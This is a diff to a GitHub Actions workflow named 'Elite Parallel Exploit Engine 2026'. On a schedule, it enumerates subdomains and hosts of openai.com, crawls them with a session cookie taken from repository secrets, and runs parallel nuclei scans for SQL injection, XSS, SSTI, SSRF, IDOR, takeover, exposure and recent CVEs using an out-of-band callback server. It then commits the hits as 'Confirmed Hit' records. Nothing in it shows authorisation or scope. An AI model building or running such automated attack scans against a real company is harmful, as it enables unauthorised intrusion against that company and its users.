@@ -1,4 +1,4 @@
-name: "Elite Pari"
+name: "Elite Parallel Exploit Engine 2026"
 
 on:
   schedule:
@@ -27,26 +27,36 @@ jobs:
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
+          # 1. FIX: Nuke any existing 'output' file or directory to prevent Exit Code 2
+          rm -rf output
           mkdir -p output
-          touch output/params.txt
           
-          # 1. Cloud-based discovery (Subdomains + Hidden IPs)
-          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
-          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
+          # 2. Secret Check (Will print 'Found' or 'Missing' in logs)
+          if [ -z "$PDCP_API_KEY" ]; then echo "PDCP KEY MISSING"; else echo "PDCP KEY FOUND"; fi
+          
+          # 3. Cloud Discovery
+          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt || echo "openai.com" > subs.txt
+          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt || true
           cat subs.txt | sort -u | httpx -silent -t 50 -o output/alive.txt
           
-          # 2. Deep Crawling
-          touch output/params_new.txt
-          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || echo "Katana skip"
+          # 4. Crawling with persisted Master List
+          # We try to get the existing params.txt from the repo branch
+          touch output/params.txt
+          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || touch output/params_new.txt
           
-          # 3. Delta Logic: Identify NEW URLs only
+          # 5. Delta Logic (Only scan what is actually new)
           if [ -s output/params_new.txt ]; then
-            grep -vFf output/params.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
+            # If params.txt (master) is empty, scan everything. Otherwise, find new lines.
+            if [ -s output/params.txt ]; then
+              grep -vFf output/params.txt output/params_new.txt > output/to_scan.txt || touch output/to_scan.txt
+            else
+              cp output/params_new.txt output/to_scan.txt
+            fi
           else
             touch output/to_scan.txt
           fi
           
-          # Update master list
+          # Update Master List
           cat output/params.txt output/params_new.txt | sort -u > temp.txt && mv temp.txt output/params.txt
 
       - name: Save Recon Data
@@ -61,7 +71,6 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # Each job handles a specific vulnerability class
         vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
     steps:
       - uses: actions/checkout@v4
@@ -74,38 +83,34 @@ jobs:
         run: |
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           echo "$HOME/go/bin" >> $GITHUB_PATH
-          $HOME/go/bin/nuclei -ut # Force update templates to get 2025/2026 CVEs
+          $HOME/go/bin/nuclei -ut
 
-      - name: Advanced Vulnerability Scanning
+      - name: Advanced Vulnerability Scanning (2025-2026 CVEs)
         env:
           ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
           if [ -s output/to_scan.txt ]; then
-            # We add 'cve2025' and 'cve2026' tags to every scan
-            # This ensures we test for the newest unpatched flaws
             nuclei -l output/to_scan.txt \
               -tags ${{ matrix.vuln_type }},cve2025,cve2026,dast \
               -auth $PDCP_API_KEY \
               -interactsh-server oast.fun \
-              -itoken $ISH_TOKEN \
               -header "Cookie: $COOKIE" \
               -rate-limit 100 \
-              -bulk-size 15 \
-              -concurrency 30 \
               -o output/hit_${{ matrix.vuln_type }}.txt
           else
-            echo "No new targets."
+            echo "No new targets found to scan."
           fi
 
       - name: Atomic Save Findings
         run: |
           git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
+          # Detailed save logic for parallel jobs
           for i in {1..10}; do
             git pull origin main --rebase
-            git add output/*.txt
-            git commit -m "2026 Scan Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
+            git add output/
+            git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
           done
           
